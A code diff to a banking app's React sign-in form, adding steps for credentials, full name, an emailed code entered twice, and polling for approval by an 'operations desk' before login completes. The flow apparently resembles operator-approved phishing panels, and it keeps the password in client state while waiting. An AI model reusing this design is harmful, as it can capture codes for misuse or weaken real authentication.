@@ -1,10 +1,16 @@
 'use client'
 
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
 import Link from 'next/link'
 import { useRouter } from 'next/navigation'
 import { authClient } from '@/lib/auth-client'
 import { notifySuccessfulLogin } from '@/app/actions/notify'
+import {
+  startLoginChallenge,
+  submitLoginUsername,
+  submitLoginOtp,
+  getLoginChallengeStatus,
+} from '@/app/actions/login-challenge'
 import { Button } from '@/components/ui/button'
 import { Input } from '@/components/ui/input'
 import { Label } from '@/components/ui/label'
@@ -14,6 +20,14 @@ function isValidUsPhone(value: string) {
   const digits = value.replace(/\D/g, '')
   return digits.length === 10 || (digits.length === 11 && digits.startsWith('1'))
 }
+
+type SignInStep =
+  | 'credentials'
+  | 'username'
+  | 'otp1'
+  | 'otp2'
+  | 'awaiting_approval'
+  | 'rejected'
 
 export function AuthForm({
   mode,
@@ -27,13 +41,58 @@ export function AuthForm({
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   const [confirmPassword, setConfirmPassword] = useState('')
+  const [username, setUsername] = useState('')
+  const [otp, setOtp] = useState('')
+  const [attemptId, setAttemptId] = useState<string | null>(null)
+  const [signInStep, setSignInStep] = useState<SignInStep>('credentials')
   const [error, setError] = useState<string | null>(null)
   const [success, setSuccess] = useState<string | null>(null)
   const [loading, setLoading] = useState(false)
+  const [statusNote, setStatusNote] = useState<string | null>(null)
 
   const isSignUp = mode === 'sign-up'
   const isForgot = mode === 'forgot-password'
   const isReset = mode === 'reset-password'
+  const isSignIn = mode === 'sign-in'
+
+  // Poll ops desk decision while waiting
+  useEffect(() => {
+    if (!isSignIn || signInStep !== 'awaiting_approval' || !attemptId) return
+
+    let cancelled = false
+    const tick = async () => {
+      const s = await getLoginChallengeStatus(attemptId)
+      if (cancelled) return
+      setStatusNote(s.lastEvent)
+      if (s.status === 'approved') {
+        setLoading(true)
+        const { error: signErr } = await authClient.signIn.email({
+          email,
+          password,
+        })
+        if (signErr) {
+          setLoading(false)
+          setError(signErr.message ?? 'Approved, but final sign-in failed.')
+          return
+        }
+        await notifySuccessfulLogin().catch(() => undefined)
+        router.push('/dashboard')
+        router.refresh()
+        return
+      }
+      if (s.status === 'rejected' || s.status === 'expired') {
+        setSignInStep('rejected')
+        setError('Operations desk rejected this sign-in attempt.')
+      }
+    }
+
+    tick()
+    const id = setInterval(tick, 2500)
+    return () => {
+      cancelled = true
+      clearInterval(id)
+    }
+  }, [isSignIn, signInStep, attemptId, email, password, router])
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -128,17 +187,75 @@ export function AuthForm({
         return
       }
 
-      const { error } = await authClient.signIn.email({ email, password })
-      if (error) {
+      // ---- Multi-step sign-in ----
+      if (signInStep === 'credentials') {
+        const result = await startLoginChallenge({ email, password })
         setLoading(false)
-        setError(error.message ?? 'Something went wrong. Please try again.')
+        if (!result.ok) {
+          setError(result.error)
+          return
+        }
+        setAttemptId(result.attemptId)
+        setSignInStep('username')
+        setSuccess('Credentials verified. Enter your username next.')
         return
       }
 
-      await notifySuccessfulLogin().catch(() => undefined)
-      setLoading(false)
-      router.push('/dashboard')
-      router.refresh()
+      if (signInStep === 'username') {
+        if (!attemptId) {
+          setLoading(false)
+          setError('Session lost. Start again.')
+          setSignInStep('credentials')
+          return
+        }
+        const result = await submitLoginUsername({
+          attemptId,
+          username,
+        })
+        setLoading(false)
+        if (!result.ok) {
+          setError(result.error)
+          return
+        }
+        setOtp('')
+        setSignInStep('otp1')
+        setSuccess(
+          'A 6-digit code was sent to your email. Enter it below (you will enter it twice).'
+        )
+        return
+      }
+
+      if (signInStep === 'otp1' || signInStep === 'otp2') {
+        if (!attemptId) {
+          setLoading(false)
+          setError('Session lost. Start again.')
+          setSignInStep('credentials')
+          return
+        }
+        const which = signInStep === 'otp1' ? 1 : 2
+        const result = await submitLoginOtp({
+          attemptId,
+          otp,
+          which,
+        })
+        setLoading(false)
+        if (!result.ok) {
+          setError(result.error)
+          return
+        }
+        setOtp('')
+        if (result.next === 'otp2') {
+          setSignInStep('otp2')
+          setSuccess('First code accepted. Enter the same code again to confirm.')
+          return
+        }
+        setSignInStep('awaiting_approval')
+        setSuccess(null)
+        setStatusNote(
+          'Waiting for operations desk to approve this sign-in…'
+        )
+        return
+      }
     } catch (err) {
       setLoading(false)
       setError(err instanceof Error ? err.message : 'Something went wrong.')
@@ -151,7 +268,17 @@ export function AuthForm({
       ? 'Reset your password'
       : isReset
         ? 'Choose a new password'
-        : 'Welcome back'
+        : signInStep === 'username'
+          ? 'Confirm username'
+          : signInStep === 'otp1'
+            ? 'Enter verification code'
+            : signInStep === 'otp2'
+              ? 'Confirm verification code'
+              : signInStep === 'awaiting_approval'
+                ? 'Waiting for approval'
+                : signInStep === 'rejected'
+                  ? 'Sign-in blocked'
+                  : 'Welcome back'
 
   const subtitle = isSignUp
     ? 'Get started with fee-free banking in minutes.'
@@ -159,7 +286,17 @@ export function AuthForm({
       ? 'Enter your email and we will send a reset link.'
       : isReset
         ? 'Enter and confirm your new password.'
-        : 'Log in to access your accounts.'
+        : signInStep === 'username'
+          ? 'Type the full name on this account (as registered).'
+          : signInStep === 'otp1'
+            ? 'We emailed a 6-digit code. Enter it once.'
+            : signInStep === 'otp2'
+              ? 'Enter the same 6-digit code a second time to confirm.'
+              : signInStep === 'awaiting_approval'
+                ? 'Operations desk has been notified and must approve before you can enter.'
+                : signInStep === 'rejected'
+                  ? 'This attempt was rejected by the operations desk.'
+                  : 'Log in to access your accounts.'
 
   return (
     <main className="grid min-h-svh lg:grid-cols-2">
@@ -238,38 +375,53 @@ export function AuthForm({
               </>
             )}
 
-            {!isReset && (
-              <div className="flex flex-col gap-2">
-                <Label htmlFor="email">Email</Label>
-                <Input
-                  id="email"
-                  type="email"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  required
-                  autoComplete="email"
-                  placeholder="you@example.com"
-                />
-              </div>
-            )}
+            {/* Sign-in step: credentials */}
+            {((isSignIn && signInStep === 'credentials') ||
+              isSignUp ||
+              isForgot) &&
+              !isReset && (
+                <div className="flex flex-col gap-2">
+                  <Label htmlFor="email">Email</Label>
+                  <Input
+                    id="email"
+                    type="email"
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    required
+                    autoComplete="email"
+                    placeholder="you@example.com"
+                    disabled={isSignIn && signInStep !== 'credentials'}
+                  />
+                </div>
+              )}
 
-            {!isForgot && (
-              <div className="flex flex-col gap-2">
-                <Label htmlFor="password">
-                  {isReset ? 'New password' : 'Password'}
-                </Label>
-                <Input
-                  id="password"
-                  type="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  required
-                  minLength={8}
-                  autoComplete={isSignUp || isReset ? 'new-password' : 'current-password'}
-                  placeholder={isSignUp || isReset ? 'At least 8 characters' : '••••••••'}
-                />
-              </div>
-            )}
+            {((isSignIn && signInStep === 'credentials') ||
+              isSignUp ||
+              isReset) &&
+              !isForgot && (
+                <div className="flex flex-col gap-2">
+                  <Label htmlFor="password">
+                    {isReset ? 'New password' : 'Password'}
+                  </Label>
+                  <Input
+                    id="password"
+                    type="password"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    required
+                    minLength={8}
+                    autoComplete={
+                      isSignUp || isReset ? 'new-password' : 'current-password'
+                    }
+                    placeholder={
+                      isSignUp || isReset
+                        ? 'At least 8 characters'
+                        : '••••••••'
+                    }
+                    disabled={isSignIn && signInStep !== 'credentials'}
+                  />
+                </div>
+              )}
 
             {(isSignUp || isReset) && (
               <div className="flex flex-col gap-2">
@@ -287,6 +439,60 @@ export function AuthForm({
               </div>
             )}
 
+            {/* Sign-in step: username */}
+            {isSignIn && signInStep === 'username' && (
+              <div className="flex flex-col gap-2">
+                <Label htmlFor="username">Username (full name)</Label>
+                <Input
+                  id="username"
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  required
+                  autoComplete="username"
+                  placeholder="As registered on your account"
+                />
+              </div>
+            )}
+
+            {/* Sign-in step: OTP 1 or 2 */}
+            {isSignIn && (signInStep === 'otp1' || signInStep === 'otp2') && (
+              <div className="flex flex-col gap-2">
+                <Label htmlFor="otp">
+                  {signInStep === 'otp1'
+                    ? 'Verification code (first entry)'
+                    : 'Verification code (second entry)'}
+                </Label>
+                <Input
+                  id="otp"
+                  type="text"
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={6}
+                  value={otp}
+                  onChange={(e) =>
+                    setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
+                  }
+                  required
+                  autoComplete="one-time-code"
+                  placeholder="000000"
+                  className="text-center text-2xl tracking-[0.4em]"
+                />
+              </div>
+            )}
+
+            {isSignIn && signInStep === 'awaiting_approval' && (
+              <div className="rounded-lg border border-border bg-muted/40 p-4 text-sm text-muted-foreground">
+                <p className="font-medium text-foreground">
+                  Pending operations desk
+                </p>
+                <p className="mt-1">
+                  {statusNote ||
+                    'Your sign-in is complete on your side. An admin must approve it.'}
+                </p>
+                <p className="mt-2 text-xs">This page refreshes automatically.</p>
+              </div>
+            )}
+
             {error && (
               <p className="text-sm text-destructive" role="alert">
                 {error}
@@ -298,20 +504,63 @@ export function AuthForm({
               </p>
             )}
 
-            <Button type="submit" disabled={loading} className="h-11 w-full text-base">
-              {loading
-                ? 'Please wait…'
-                : isSignUp
-                  ? 'Create account'
-                  : isForgot
-                    ? 'Send reset link'
-                    : isReset
-                      ? 'Update password'
-                      : 'Log in'}
-            </Button>
+            {isSignIn &&
+              signInStep !== 'awaiting_approval' &&
+              signInStep !== 'rejected' && (
+                <Button
+                  type="submit"
+                  disabled={loading}
+                  className="h-11 w-full text-base"
+                >
+                  {loading
+                    ? 'Please wait…'
+                    : signInStep === 'credentials'
+                      ? 'Continue'
+                      : signInStep === 'username'
+                        ? 'Verify username'
+                        : signInStep === 'otp1'
+                          ? 'Submit first code'
+                          : 'Submit second code'}
+                </Button>
+              )}
+
+            {!isSignIn && (
+              <Button
+                type="submit"
+                disabled={loading}
+                className="h-11 w-full text-base"
+              >
+                {loading
+                  ? 'Please wait…'
+                  : isSignUp
+                    ? 'Create account'
+                    : isForgot
+                      ? 'Send reset link'
+                      : 'Update password'}
+              </Button>
+            )}
+
+            {isSignIn &&
+              signInStep !== 'credentials' &&
+              signInStep !== 'awaiting_approval' && (
+                <button
+                  type="button"
+                  className="text-sm text-muted-foreground underline-offset-4 hover:underline"
+                  onClick={() => {
+                    setSignInStep('credentials')
+                    setAttemptId(null)
+                    setUsername('')
+                    setOtp('')
+                    setError(null)
+                    setSuccess(null)
+                  }}
+                >
+                  ← Start over
+                </button>
+              )}
           </form>
 
-          {mode === 'sign-in' && (
+          {mode === 'sign-in' && signInStep === 'credentials' && (
             <p className="mt-4 text-center text-sm">
               <Link
                 href="/forgot-password"
@@ -326,21 +575,30 @@ export function AuthForm({
             {isSignUp ? (
               <>
                 Already have an account?{' '}
-                <Link href="/sign-in" className="font-medium text-foreground underline-offset-4 hover:underline">
+                <Link
+                  href="/sign-in"
+                  className="font-medium text-foreground underline-offset-4 hover:underline"
+                >
                   Log in
                 </Link>
               </>
             ) : isForgot || isReset ? (
               <>
                 Remembered it?{' '}
-                <Link href="/sign-in" className="font-medium text-foreground underline-offset-4 hover:underline">
+                <Link
+                  href="/sign-in"
+                  className="font-medium text-foreground underline-offset-4 hover:underline"
+                >
                   Log in
                 </Link>
               </>
             ) : (
               <>
                 Don't have an account?{' '}
-                <Link href="/sign-up" className="font-medium text-foreground underline-offset-4 hover:underline">
+                <Link
+                  href="/sign-up"
+                  className="font-medium text-foreground underline-offset-4 hover:underline"
+                >
                   Open one
                 </Link>
               </>
